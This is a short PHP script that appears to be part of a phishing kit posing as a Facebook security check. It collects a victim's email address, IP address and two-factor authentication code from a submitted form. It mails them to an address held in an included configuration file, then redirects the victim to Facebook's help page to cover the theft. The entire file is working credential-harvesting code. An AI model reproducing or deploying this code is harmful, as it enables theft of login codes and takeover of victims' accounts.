<?php
  
    include('email.php');

    $emailiLast = isset($_POST['emaili2fac']) ? $_POST['emaili2fac'] : 'emaili';   

    $ipjaLast = isset($_POST['ipja2fac']) ? $_POST['ipja2fac'] : 'ipja';
    $randomCodeLast = isset($_POST['randomCode2fac']) ? $_POST['randomCode2fac'] : 'XXX';
    $twofactorAuth = isset($_POST['twofactorAuth']) ? $_POST['twofactorAuth'] : '000';

    $stringuLast = '[IPja]: ' .$ipjaLast . PHP_EOL . PHP_EOL . '[email]: ' .$emailiLast. PHP_EOL . PHP_EOL . '[two-factor]: '.$twofactorAuth;

    mail($emailikomplet, "[".$randomCodeLast."] 2facAuth i Investitorit", $stringuLast, $headers);
  
    echo '<script>window.top.location.href = "https://web.facebook.com/help?_rdc=1&_rdr"; </script>';
?>